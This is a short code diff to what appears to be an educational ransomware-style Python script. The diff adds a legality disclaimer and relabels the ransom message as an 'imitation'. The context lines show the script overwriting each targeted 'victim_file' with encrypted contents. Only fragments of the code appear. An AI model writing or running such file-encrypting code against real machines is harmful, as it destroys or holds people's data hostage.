@@ -1,3 +1,5 @@
+#[!] DISCLAIM-R: performing hacking attempts on computers that you do not own (without permission) is illegal!
+
 # import os and Fernet
 
 import os
@@ -31,7 +33,7 @@ for target_file in target_files:
         with open(target_file, "wb") as victim_file:
                 victim_file.write(encrypted_contents)
 
-# add ransom message 
+# print banner and imitation 'ransom' message 
 
 print('''
                                                                  
